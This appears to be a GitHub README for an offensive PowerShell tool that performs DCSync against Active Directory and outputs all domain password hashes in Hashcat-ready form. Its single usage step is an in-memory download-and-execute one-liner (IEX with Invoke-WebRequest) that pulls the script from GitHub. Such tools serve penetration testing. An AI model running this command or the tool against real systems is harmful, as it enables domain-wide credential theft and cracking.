# DCSync-To-Hashcat
Performs DCSync, extracts all hashes in a Hashcat friendly format

Execute from GitHub:

```
IEX(IWR -usebasicparsing https://raw.githubusercontent.com/The-Viper-One/DCSync-To-Hashcat/main/DCSync-To-Hashcat.ps1)
```
